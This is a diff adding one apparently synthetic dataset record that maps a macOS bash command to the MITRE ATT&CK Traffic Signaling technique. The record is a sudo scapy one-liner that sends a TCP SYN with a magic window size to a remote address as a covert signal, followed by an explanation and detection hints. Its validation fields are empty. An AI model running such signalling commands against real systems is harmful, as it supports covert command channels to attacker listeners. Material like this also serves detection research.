@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo bash -c 'python3 - << \"PY\"\\nfrom scapy.all import IP, TCP, send\\nsend(IP(dst=\"203.0.113.50\")/TCP(dport=80, flags=\"S\", window=1337), verbose=0)\\nPY'",
+  "explanation": "Crafts and sends a TCP SYN with a magic window size (1337) to 203.0.113.50:80 using scapy, acting as a covert signal to a remote listener. Run with sudo to ensure raw socket permissions.",
+  "rationale_steps": [
+    "Use scapy to set a distinctive TCP header field as the signaling channel.",
+    "No obfuscation; relies on header semantics that are uncommon in normal traffic.",
+    "Detection: NIDS signatures on anomalous TCP window sizes or rare patterns; baseline deviations for SYN header anomalies."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-fe1a2ad7-dd4d2920",
+  "source_prompt_hash": "fe1a2ad7",
+  "timestamp_utc": "2025-09-30T06:07:36.671120Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
